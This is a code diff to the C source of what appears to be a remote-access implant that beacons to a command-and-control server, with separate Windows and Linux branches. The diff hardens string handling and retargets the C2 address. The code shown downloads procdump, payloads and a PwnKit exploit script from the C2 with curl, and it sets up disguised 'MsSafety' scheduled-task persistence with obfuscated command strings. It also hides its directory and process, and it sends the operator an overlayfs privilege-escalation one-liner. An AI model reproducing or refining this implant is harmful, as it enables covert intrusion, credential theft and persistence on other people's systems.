@@ -24,7 +24,7 @@ Linux:
 - implement port forwarding or even better socks proxy + proxy chain
 */
 
-#define C2_ADDR "127.0.0.1"
+#define C2_ADDR "192.168.178.73"
 #define C2_PORT 1337
 #define C2_WEB_PORT 1337
 
@@ -58,19 +58,6 @@ char HOME[300]="windows";
 
 char init_msg[]="windows\n";
 
-void* realloc_zero(void* pBuffer, size_t oldSize, size_t newSize) {
-  void* pNew = realloc(pBuffer, newSize);
-  if(pNew==NULL) {
-      return(NULL);
-  }
-  if ( newSize > oldSize && pNew ) {
-    size_t diff = newSize - oldSize;
-    void* pStart = ((char*)pNew) + oldSize;
-    memset(pStart, 0, diff);
-  }
-  return pNew;
-}
-
 int _conn_init() {
     if(es_init()==-1) {
         return(-1);
@@ -83,7 +70,7 @@ response _recv() {
     #if DEBUG==1
     printf("receiving...\n");//debug
     #endif
-    response r=es_recv(4096, 1, 0);
+    response r=es_recv(4096);
     #if DEBUG==1
     printf("es_recv returned!\n");//debug
     #endif
@@ -161,7 +148,7 @@ char *exec(char *in) {
     char *cmd=malloc(strlen("echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log")+strlen(in)+1);
     memset(cmd, 0, strlen("echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log")+strlen(in)+1);
     if(got_lolba==1) {
-        sprintf(cmd, "echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log", in);
+        snprintf(cmd, strlen("echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log")+strlen(in)+1, "echo %s > C:\\Users\\%%username%%\\co.bat && dxcap -c \'C:\\Users\\%%username%%\\co.bat\' && del C:\\Users\\%%username%%\\co.bat && del C:\\Users\\%%username%%\\co*log", in);
     }
     else {
         sprintf(cmd, "%s", in);
@@ -178,6 +165,7 @@ char *exec(char *in) {
     }
 
     char *output = malloc(4096);
+    memset(output, 0, 4096);
     int buf_sz=4096;
     while(1) {
         char buff[4097]="";
@@ -209,7 +197,7 @@ void passdump() {
     //Extract credentials
     //mimikatz # sekurlsa::logonPasswords
     char d[1000];
-    sprintf(d,"curl %s:%d/%s/procdump.exe -o hello.exe",C2_ADDR, C2_WEB_PORT, magic);
+    snprintf(d, 1000, "curl %s:%d/%s/procdump.exe -o hello.exe",C2_ADDR, C2_WEB_PORT, magic);
     #if DEBUG==1
     puts(d);
     #endif
@@ -234,13 +222,8 @@ void crash() {
 int implant() {
     char* struser = getenv("username");
     char strnewname[500]="";
-    if(strlen(("C:\\Users\\%s\\Safety\\MsSafety.exe")+strlen(struser)) > 500) {
-        #if DEBUG==1
-        printf("implant: error newname to long(>500bytes)!\n");
-        #endif
-        return(-1);
-    }
-    sprintf(strnewname, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);
+
+    snprintf(strnewname, 500, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);
 
     //char reg1[1024]="reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v MsSafety /t REG_SZ /f /d ";
     //char reg2[1024]="reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v MsSafety /t REG_SZ /f /d ";
@@ -268,7 +251,7 @@ int implant() {
         #endif
         return(-1);
     }
-    sprintf(autorun, "schtasks /cr\"ea\"te /f /sc minute /mo 1  /tn \"MsSafety\" /tr %s",strnewname);
+    snprintf(autorun, 500, "schtasks /cr\"ea\"te /f /sc minute /mo 1  /tn \"MsSafety\" /tr %s",strnewname);
     #if DEBUG==1
     puts(autorun);
     #endif
@@ -292,19 +275,13 @@ int hide(char **argv) {
     ShowWindow(window, 0);
     char* struser = getenv("username");
     char dirname[500]="";
-    if(strlen("C:\\Users\\%s\\Safety")+strlen(struser)>500) {
-        #if DEBUG==1
-        printf("hide: error newdirname too long (>500 bytes!)\n")
-        #endif
-        return(-1);
-    }
-    sprintf(dirname, "C:\\Users\\%s\\Safety", struser);
+    snprintf(dirname, 500, "C:\\Users\\%s\\Safety", struser);
     CreateDirectory(dirname, NULL);
     char d[1024]="";
-    sprintf(d, "attrib +s +h %s", dirname);
+    snprintf(d, 1024, "attrib +s +h %s", dirname);
     free(exec(d));
     char strnewname[500]="";
-    sprintf(strnewname, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);
+    snprintf(strnewname, 500, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);
     FILE *ftp;
     ftp=fopen(strnewname, "rb");
     if(ftp) {
@@ -399,12 +376,12 @@ int check_msg(char *msg) {
             free(exec("schtasks /de\"let\"e /f /tn MsSafety"));
             return(2);
         }
-        sprintf(strnewname, "C:\\Users\\%s\\Safety\\ms.bat", struser);
-        sprintf(lol,"curl %s:%d/%s/killswitch.bat -o %s",C2_ADDR, C2_WEB_PORT, magic, strnewname);
+        snprintf(strnewname, 500, "C:\\Users\\%s\\Safety\\ms.bat", struser);
+        snprintf(lol, 1000, "curl %s:%d/%s/killswitch.bat -o %s",C2_ADDR, C2_WEB_PORT, magic, strnewname);
         puts(lol);
         free(exec(lol));
         free(exec("schtasks /de\"let\"e /f /tn MsSafety"));
-        sprintf(lol, "start /B %s", strnewname);
+        snprintf(lol, 1000, "start /B %s", strnewname);
         free(exec(lol));
         return(2);
     }
@@ -417,12 +394,12 @@ int check_msg(char *msg) {
             #endif
             return(0);
         }
-        sprintf(strnewname, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);
+        snprintf(strnewname, 500, "C:\\Users\\%s\\Safety\\MsSafety.exe", struser);
         char strnewername[500]="";
-        sprintf(strnewername, "C:\\Users\\%s\\Safety\\MsSafety2.exe", struser);
+        snprintf(strnewername, 500, "C:\\Users\\%s\\Safety\\MsSafety2.exe", struser);
         rename(strnewname, strnewername);
         char d[1000]="";
-        sprintf(d,"curl %s:%d/%s/beacon_global.exe -o %s",C2_ADDR, C2_WEB_PORT, magic, strnewname);
+        snprintf(d, 100, "curl %s:%d/%s/beacon_global.exe -o %s",C2_ADDR, C2_WEB_PORT, magic, strnewname);
         free(exec(d));
         char info[50]="update finished!";
         _send(info);
@@ -431,9 +408,9 @@ int check_msg(char *msg) {
     else if(strcmp(msg, "pyinstall")==0) {
         char* struser = getenv("username");
         char oname[300]="";
-        sprintf(oname, "C:\\Users\\%s\\Safety\\python-3.8.5.exe", struser);
+        snprintf(oname, 300, "C:\\Users\\%s\\Safety\\python-3.8.5.exe", struser);
         char d[1000]="";
-        sprintf(d, "curl %s:%d/%s/python-3.8.5.exe --output \"%s\" && \"%s\" InstallAllUsers=0 Include_launcher=0 Include_test=0 PrependPath=1 /quiet", C2_ADDR, C2_WEB_PORT, magic, oname, oname);
+        snprintf(d, 1000, "curl %s:%d/%s/python-3.8.5.exe --output \"%s\" && \"%s\" InstallAllUsers=0 Include_launcher=0 Include_test=0 PrependPath=1 /quiet", C2_ADDR, C2_WEB_PORT, magic, oname, oname);
         #if DEBUG==1
         puts(d);
         #endif
@@ -470,23 +447,8 @@ int check_msg(char *msg) {
         _send(info);
         return(1);
     }
-    else if(strstr(msg, "upload")!=NULL) {
-        char msg2[s+1]="";
-        memmove(msg2, msg, s+1);
-        #if DEBUG==1
-        puts("\n");
-        puts(msg2);
-        #endif
-        char *tok1=strtok(msg2, " ");
-        if(tok1==NULL) {
-            #if DEBUG==1
-            printf("invalid syntax: %s\nusage: upload <dest>\n", msg);
-            #endif
-            sprintf(msg, "invalid syntax: %s\nusage: upload <dest>\n", msg);
-            _send(msg);
-            return(1);
-        }
-        char *dest=tok1+strlen("upload")+1;
+    else if(strncmp(msg, "upload ", 7)==0) {
+        char *dest=msg+7;
         #if DEBUG==1
         puts("uploading...\n");
         printf("dest: %s\n", dest);
@@ -495,39 +457,24 @@ int check_msg(char *msg) {
             char err[]="upload failed!\n";
             _send(err);
         }
-        else {
-            char suc[]="upload successful!\n";
-            _send(suc);
-        }
         return(1);
     }
-    else if(strstr(msg, "download")!=NULL) {
-        char msg2[s+1]="";
-        memmove(msg2, msg, s+1);
-        #if DEBUG==1
-        puts("\n");
-        puts(msg2);
-        #endif
-        char *tok1=strtok(msg2, " ");
-        if(tok1==NULL) {
-            #if DEBUG==1
-            printf("invalid syntax: %s\nusage: download <dest>\n", msg);
-            #endif
-            sprintf(msg, "invalid syntax: %s\nusage: download <dest>\n", msg);
-            _send(msg);
-            return(1);
-        }
-        char *path=tok1+strlen("download")+1;
-        #if DEBUG==1
-        printf("trying to download %s\n", path);
-        #endif
+    else if(strncmp(msg, "download ", 9)==0) {
+        char *path=msg+9;
         if(download(path)==-1) {
             char err[]="download failed!\n";
             _send(err);
         }
-        else {
-            char suc[]="download successful!\n";
-            _send(suc);
+        return(1);
+    }
+    else if (strlen(msg)>3 && msg[0]=='c' && msg[1]=='d' && msg[2]==' '){
+        char *path=msg+3;
+        #if DEBUG==1
+        printf("chdir to %s!\n", path);
+        #endif
+        int cres=chdir(path);
+        if(cres==-1) {
+           perror("chdir failed");
         }
         return(1);
     }
@@ -801,7 +748,7 @@ int hide(char **argv) {
         free(exec("cp /etc/mtab /tmp/mtab"));
         pid_t pid=getpid();
         char pidstr[30]="";
-        sprintf(pidstr, "%d", pid);
+        snprintf(pidstr, 30, "%d", pid);
         char *dest=malloc(strlen(pidstr)+strlen("/proc/")+1);
         memmove(dest, "/proc", 6);
         memmove(dest+strlen(dest), pidstr, strlen(pidstr)+1);
@@ -828,7 +775,7 @@ int pwnkit() {
     }
     else{
         char cmd[4096]="";
-        sprintf(cmd, "curl %s:%d/%s/PwnKite.py -o /tmp/PwnKite.py", C2_ADDR, C2_WEB_PORT, magic);
+        snprintf(cmd, 4096, "curl %s:%d/%s/PwnKite.py -o /tmp/PwnKite.py", C2_ADDR, C2_WEB_PORT, magic);
         free(exec(cmd));
         char ret[] = "PwnKit downloaded to /tmp/PwnKite.py!";
         if(_send(ret)==0) {
@@ -912,7 +859,7 @@ int game_overlay() {
     dup2(sock, 2);
     char command[]="unshare -rm sh -c \"mkdir l u w m;cp /bin/sh l/;setcap cap_setuid+eip l/sh;mount -t overlay overlay -o userxattr,rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;u/sh;\"";
     char ms[500]="";
-    sprintf(ms, "run to get root:\n%s\n\n", command);
+    snprintf(ms, 500, "run to get root:\n%s\n\n", command);
     if(_send(ms)==0) {
         #if DEBUG==1
         printf("send failed!\n");
@@ -980,7 +927,7 @@ int nyan() {
         }
     }
     char cmd_[4096]="";
-    sprintf(cmd_, "curl %s:%d/%s/nyancat -o /tmp/nyanrner", C2_ADDR, C2_WEB_PORT, magic);
+    snprintf(cmd_, 4096, "curl %s:%d/%s/nyancat -o /tmp/nyanrner", C2_ADDR, C2_WEB_PORT, magic);
     free(exec(cmd_));
     free(exec("chmod +x /tmp/nyanrner"));
     free(exec("for i in /dev/pts/*; do if [ -r \"$i\" ]; then bash -c \"/tmp/nyanrner\" > $i & fi; done"));
@@ -1030,23 +977,8 @@ int check_msg(char *msg) {
         _send(me);
         return(1);
     }
-    else if(strstr(msg, "upload")!=NULL) {
-        char msg2[s+1];
-        memmove(msg2, msg, s+1);
-        #if DEBUG==1
-        puts("\n");
-        puts(msg2);
-        #endif
-        char *tok1=strtok(msg2, " ");
-        if(tok1==NULL) {
-            #if DEBUG==1
-            printf("invalid syntax: %s\nusage: upload <dest>\n", msg);
-            #endif
-            sprintf(msg, "invalid syntax: %s\nusage: upload <dest>\n", msg);
-            _send(msg);
-            return(1);
-        }
-        char *dest=tok1+strlen("upload")+1;
+    else if(strncmp(msg, "upload ", 7)==0) {
+        char *dest=msg+7;
         #if DEBUG==1
         puts("uploading...\n");
         printf("dest: %s\n", dest);
@@ -1055,36 +987,13 @@ int check_msg(char *msg) {
             char err[]="upload failed!\n";
             _send(err);
         }
-        else {
-            char suc[]="upload successful!\n";
-            _send(suc);
-        }
         return(1);
     }
-    else if(strstr(msg, "download")!=NULL) {
-        char msg2[s+1];
-        memmove(msg2, msg, s+1);
-        #if DEBUG==1
-        puts("\n");
-        puts(msg2);
-        #endif
-        char *tok1=strtok(msg2, " ");
-        if(tok1==NULL) {
-            #if DEBUG==1
-            printf("invalid syntax: %s\nusage: download <dest>\n", msg);
-            #endif
-            sprintf(msg, "invalid syntax: %s\nusage: download <dest>\n", msg);
-            _send(msg);
-            return(1);
-        }
-        char *path=tok1+strlen("download")+1;
+    else if(strncmp(msg, "download ", 9)==0) {
+        char *path=msg+9;
         if(download(path)==-1) {
             char err[]="download failed!\n";
             _send(err);
-        }
-        else {
-            char suc[]="download successful!\n";
-            _send(suc);
         }
         return(1);
     }
@@ -1129,7 +1038,7 @@ int check_msg(char *msg) {
         _cleanup();
         return(2);
     }
-    else if (strlen(msg)>3 && msg[0]=='c' && msg[1]=='d' && msg[2]==' '){
+    else if( (strlen(msg)>3 && strncmp(msg, "cd ", 3)==0)){
         char *path=msg+3;
         #if DEBUG==1
         printf("chdir to %s!\n", path);
@@ -1188,14 +1097,8 @@ int main(int argc, char **argv)
         fclose(ftp);
     }
     char* struser = getenv("username");
-    if(strlen(struser)<300) {
-        sprintf(HOME, "C:\\Users\\%s\\", struser);
-    }
-    #if DEBUG==1
-    else {
-        printf("error HOME dir bigger than 300bytes!\n");
-    }
-    #endif
+    snprintf(HOME, 300, "C:\\Users\\%s\\", struser);
+    HOME[299]='\0';
     #endif
 
     if(_conn_init()!=0) {
